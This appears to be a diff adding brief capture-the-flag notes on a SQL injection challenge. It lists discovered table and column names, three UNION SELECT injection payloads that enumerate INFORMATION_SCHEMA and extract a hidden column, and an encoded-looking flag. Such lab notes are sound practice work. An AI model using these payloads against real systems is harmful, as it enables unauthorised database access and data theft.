@@ -1,0 +1,12 @@
+table = w0w_y0u_f0und_m3
+column = f0und_m3
+
+
+9999 UNION SELECT 1,2,table_name,4 FROM INFORMATION_SCHEMA.COLUMNS
+
+9999 UNION SELECT 1,column_name,table_name,4 FROM INFORMATION_SCHEMA.COLUMNS #
+
+9999 UNION SELECT 1,f0und_m3,3,4 FROM w0w_y0u_f0und_m3 #
+
+
+MQDzqdor{Ix4Oa41W_1F_B00h_m1YlqPpPP}
